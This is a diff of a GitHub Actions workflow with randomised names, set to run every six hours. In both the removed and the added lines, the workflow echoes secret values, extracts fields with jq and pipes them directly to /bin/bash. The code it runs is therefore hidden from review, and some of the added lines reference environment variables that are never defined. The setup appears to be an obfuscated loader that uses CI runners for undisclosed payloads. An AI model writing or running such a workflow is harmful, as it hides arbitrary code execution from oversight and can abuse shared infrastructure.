@@ -1,22 +1,20 @@
 name: wangguorong7164
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 3/6 * * *'
-jobs:  # 18059
+    - cron: '33 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wangguorong7164
         env:
-          mx073: ${{ secrets.mx073 }}
+          gt97259: ${{ secrets.gt97259 }}
         run: |
-          echo $mx073 | jq -r .hwj97999 | /bin/bash
-          echo $fenq96 | jq -r .o66956 | /bin/bash
-          echo $xhiv4 | jq -r .p08027 | /bin/bash
-          echo $jxskn33352 | jq -r .avf87405 | /bin/bash
-          echo $zzzox63 | jq -r .qdcg9 | /bin/bash
-          echo $akc41149 | jq -r .na19 | /bin/bash
-          echo $ioivq4611 | jq -r .dcjz8 | /bin/bash
+          echo $gt97259 | jq -r .r1807 | /bin/bash
+          echo $xhzhc59 | jq -r .yzvh799 | /bin/bash
+          echo $qy12 | jq -r .etjd4359 | /bin/bash
 
